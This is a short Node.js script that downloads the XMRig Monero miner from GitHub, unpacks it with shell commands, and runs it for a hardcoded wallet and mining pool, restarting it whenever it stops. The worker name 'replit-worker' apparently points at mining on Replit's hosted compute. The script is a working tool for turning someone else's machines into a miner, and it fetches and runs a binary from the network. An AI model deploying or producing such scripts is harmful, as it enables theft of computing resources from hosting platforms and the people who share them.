const { spawn, execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));

const minerUrl = 'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz';
const minerTar = 'xmrig.tar.gz';
const minerFolder = 'xmrig-6.21.0';
const minerBinary = './xmrig';

async function downloadXmrig() {
  if (!fs.existsSync(minerBinary)) {
    console.log('[*] XMRig not found. Downloading...');

    try {
      const response = await fetch(minerUrl);
      if (!response.ok) throw new Error(`Unexpected response ${response.statusText}`);

      const fileStream = fs.createWriteStream(minerTar);
      await new Promise((resolve, reject) => {
        response.body.pipe(fileStream);
        response.body.on('error', reject);
        fileStream.on('finish', resolve);
      });

      console.log('[*] Extracting XMRig...');
      execSync(`tar -xzf ${minerTar}`);
      execSync(`mv ${path.join(minerFolder, 'xmrig')} ./xmrig`);
      execSync(`chmod +x ./xmrig`);
      execSync(`rm -rf ${minerTar} ${minerFolder}`);
      console.log('[*] XMRig downloaded and ready.');
    } catch (err) {
      console.error('[!] Failed to download or setup XMRig:', err.message);
      process.exit(1);
    }
  } else {
    console.log('[*] XMRig already present. Skipping download.');
  }
}

async function startMining() {
  console.log('[*] Starting XMRig...');

  const pool = 'xmr-eu1.nanopool.org:14444';
  const wallet = '48ahQdgq3V2Vtoh6We2sM1YH6BSQxH4m9T4G38AJkubkYZBxye2B9kWgCHTEYiq5Wyb52xjTYY4CAie75T41iCr91gGZ9UP';
  const workerName = 'replit-worker';
  const email = 'your@email.com';

  const xmrig = spawn(minerBinary, [
    '-o', pool,
    '-u', `${wallet}.${workerName}/${email}`,
    '-p', 'x',
    '--coin', 'monero',
    '--donate-level', '1',
    '--cpu-priority', '5',
    '--max-cpu-usage', '75',
  ], { stdio: ['ignore', 'pipe', 'pipe'] });

  xmrig.stdout.on('data', (data) => {
    process.stdout.write(`xmrig: ${data}`);
  });

  xmrig.stderr.on('data', (data) => {
    process.stderr.write(`xmrig error: ${data}`);
  });

  xmrig.on('close', (code) => {
    console.error(`[!] XMRig exited with code ${code}. Restarting in 5 seconds...`);
    setTimeout(startMining, 5000);
  });
}

(async () => {
  await downloadXmrig();
  await startMining();
})();
